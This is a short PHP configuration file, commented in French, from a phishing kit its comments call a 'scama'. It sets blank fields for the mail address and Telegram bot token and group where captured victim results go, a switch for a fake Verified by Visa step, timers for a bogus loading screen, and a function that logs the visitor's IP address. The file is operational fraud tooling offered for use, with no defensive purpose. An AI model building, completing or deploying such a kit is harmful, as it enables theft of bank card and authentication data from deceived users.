<?php
//infos de rez mail + telegram
$my_mail = "";
$bot_token = "";
$group_id = "";


//vbv = true
//pas de vbv = false
$vbv = true;

//temps du chargement vbv et fin de scama
$timer = "45";
$timer_end = "10";


 function _ip() {
    $ipaddress = '';
    if(getenv('HTTP_CLIENT_IP')){
        $ipaddress = getenv('HTTP_CLIENT_IP');
    }
    elseif(getenv('HTTP_X_FORWARDED_FOR')){
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    }
    elseif(getenv('HTTP_X_FORWARDED')){
        $ipaddress = getenv('HTTP_X_FORWARDED');
    }
    elseif(getenv('HTTP_FORWARDED_FOR')){
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    }
    elseif(getenv('HTTP_FORWARDED')){
       $ipaddress = getenv('HTTP_FORWARDED');
    }
    elseif(getenv('REMOTE_ADDR')){
        $ipaddress = getenv('REMOTE_ADDR');
    }
    else{
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}
